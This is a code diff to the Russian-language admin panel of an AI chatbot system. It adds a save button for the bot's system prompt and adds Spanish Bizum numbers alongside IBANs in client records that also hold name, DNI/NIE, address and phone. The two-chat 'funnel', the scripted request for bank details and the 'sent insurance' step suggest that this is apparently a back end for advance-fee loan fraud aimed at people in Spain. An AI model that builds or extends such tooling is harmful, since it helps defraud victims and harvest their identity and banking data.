@@ -577,7 +577,12 @@
         <div class="card">
           <h2>Системный промпт</h2>
           <textarea id="systemPrompt" spellcheck="false"></textarea>
-          <p class="hint">Переменные: <code>{{name}}</code>, <code>{{bank}}</code>. Добавьте <code>[[FIN]]</code> в конец финального сообщения — система покажет кнопку перехода к форме. Сохраняется кнопкой «Сохранить» в блоке нейросети выше.</p>
+          <p class="hint">Переменные: <code>{{name}}</code>, <code>{{bank}}</code>. Добавьте <code>[[FIN]]</code> в конец финального сообщения — система покажет кнопку перехода к форме.</p>
+          <div class="actions">
+            <button id="systemPromptSaveBtn">Сохранить</button>
+            <button class="btn-ghost" id="systemPromptReloadBtn">Сбросить</button>
+            <span class="status" id="systemPromptStatus"></span>
+          </div>
         </div>
 
         <!-- CHAT SUPPORT PROMPT (второй чат — chat.html) -->
@@ -840,8 +845,8 @@
           <p class="hint" style="margin:0 0 18px;">Шаг «Отправил страховку» отправляет тот же документ, что и «Страховка» в меню скрепки — текст задавать не нужно.</p>
 
           <div class="field">
-            <label>1. Запросил IBAN (в чат)</label>
-            <textarea id="scenarioRdIbanReq" spellcheck="false" style="min-height:80px;" placeholder="Indiqueme su IBAN para la transferencia..."></textarea>
+            <label>1. Запросил IBAN / Bizum (в чат)</label>
+            <textarea id="scenarioRdIbanReq" spellcheck="false" style="min-height:80px;" placeholder="Indíqueme su IBAN o número de Bizum para la transferencia..."></textarea>
           </div>
 
           <div class="field">
@@ -1276,11 +1281,15 @@
         botFields.historyLimit.value = sp.historyLimit;
       }
 
-      function fillBot(cfg){
-        botFields.systemPrompt.value = cfg.systemPrompt || '';
+      function fillProviderSettings(cfg){
         botFields.provider.value = cfg.provider || 'deepseek';
         botFields.tgRequestLogging.checked = cfg.tgRequestLogging === true;
         applyStaticParams(botFields.provider.value);
+      }
+
+      function fillBot(cfg){
+        botFields.systemPrompt.value = cfg.systemPrompt || '';
+        fillProviderSettings(cfg);
       }
 
       function loadBotConfig(){
@@ -1294,7 +1303,6 @@
         var provider = botFields.provider.value;
         var sp = staticFor(provider);
         var payload = {
-          systemPrompt: botFields.systemPrompt.value,
           provider: provider,
           model: sp.model,
           temperature: sp.temperature,
@@ -1303,10 +1311,34 @@
           tgRequestLogging: botFields.tgRequestLogging.checked,
         };
         apiFetch('/api/admin/bot-config',{method:'PUT',body:JSON.stringify(payload)})
-          .then(function(cfg){ fillBot(cfg); btn.disabled=false; st.className='status ok'; st.textContent='✓ Сохранено'; setTimeout(function(){st.textContent='';},2500); })
+          .then(function(cfg){ fillProviderSettings(cfg); btn.disabled=false; st.className='status ok'; st.textContent='✓ Сохранено'; setTimeout(function(){st.textContent='';},2500); })
           .catch(function(e){ btn.disabled=false; st.className='status err'; st.textContent='Ошибка: '+e.message; });
       });
       botFields.provider.addEventListener('change', function(){ applyStaticParams(botFields.provider.value); });
+
+      function loadSystemPrompt(){
+        document.getElementById('systemPromptStatus').textContent = '';
+        return apiFetch('/api/admin/bot-config')
+          .then(function(cfg){ botFields.systemPrompt.value = cfg.systemPrompt || ''; })
+          .catch(function(){});
+      }
+
+      document.getElementById('systemPromptSaveBtn').addEventListener('click', function(){
+        var btn = this; var st = document.getElementById('systemPromptStatus');
+        btn.disabled = true; st.className = 'status'; st.textContent = 'Сохраняю…';
+        apiFetch('/api/admin/bot-config', {
+          method: 'PUT',
+          body: JSON.stringify({ systemPrompt: botFields.systemPrompt.value })
+        })
+          .then(function(cfg){
+            botFields.systemPrompt.value = cfg.systemPrompt || '';
+            btn.disabled = false; st.className = 'status ok'; st.textContent = '✓ Сохранено';
+            setTimeout(function(){ st.textContent = ''; }, 2500);
+          })
+          .catch(function(e){ btn.disabled = false; st.className = 'status err'; st.textContent = 'Ошибка: ' + e.message; });
+      });
+
+      document.getElementById('systemPromptReloadBtn').addEventListener('click', loadSystemPrompt);
 
       // ── Ключи ИИ (БД перебивает .env) ──────────────────────────────────────────
       function renderAiKeys(items){
@@ -1668,9 +1700,31 @@
         '</div>';
       }
 
+      function formatClientBizum(value) {
+        var digits = String(value || '').replace(/\D/g, '');
+        if (digits.indexOf('0034') === 0 && digits.length === 13) digits = digits.slice(4);
+        else if (digits.indexOf('34') === 0 && digits.length === 11) digits = digits.slice(2);
+        if (!/^[67]\d{8}$/.test(digits)) return String(value || '').trim();
+        return '+34 ' + digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6);
+      }
+
       function renderClientDetail(c, body, chatMsgs, supportMsgs){
         supportMsgs = supportMsgs || [];
         var sub = c.submissionData || {};
+        var clientPaymentMethod = String(sub.paymentMethod || c.paymentMethod || '').trim().toLowerCase();
+        var clientBizum = String(sub.bizum || c.bizum || '').trim();
+        var clientIban = String(sub.iban || c.iban || '').trim();
+        var clientDestination = null;
+        if (clientPaymentMethod === 'bizum' && clientBizum) {
+          clientDestination = { label: 'Bizum', value: formatClientBizum(clientBizum) };
+        } else if (clientPaymentMethod === 'iban' && clientIban) {
+          clientDestination = { label: 'IBAN', value: clientIban };
+        } else if (clientIban) {
+          // Старые записи не содержат paymentMethod и хранят только iban.
+          clientDestination = { label: 'IBAN', value: clientIban };
+        } else if (clientBizum) {
+          clientDestination = { label: 'Bizum', value: formatClientBizum(clientBizum) };
+        }
         var events = c.events || [];
         // Тот же статус, что в шапке карточки — канонический funnelStatus.
         var dispStatus = c.funnelStatus || c.status;
@@ -1694,13 +1748,14 @@
           // ─ Данные формы
           '<div class="client-section">' +
             '<div class="section-title">Анкета (detail-transaction)</div>' +
-            (sub.nombre || sub.dni ? (
-              kv('ФИО', sub.nombre) + kv('DNI/NIE', sub.dni) + kv('IBAN', sub.iban) +
+            (sub.nombre || sub.dni || clientDestination ? (
+              kv('ФИО', sub.nombre) + kv('DNI/NIE', sub.dni) +
+              kv(clientDestination ? clientDestination.label : 'IBAN / Bizum', clientDestination ? clientDestination.value : '') +
               kv('Адрес', [sub.calle, sub.piso, sub.ciudad, sub.provincia, sub.cp].filter(Boolean).join(', '))
             ) : '<div style="color:var(--muted);font-size:12px;">Форма не заполнена</div>') +
           '</div>' +
 
-          // ─ Чат с ботом (1-й чат — assistant.html: цель/сумма/IBAN)
+          // ─ Чат с ботом (1-й чат — assistant.html: цель/сумма/IBAN или Bizum)
           renderChatSection('Диалог с ботом · 1-й чат (assistant)', chatMsgs) +
 
           // ─ Чат поддержки (2-й чат — chat.html: DNI/NIE + телефон)
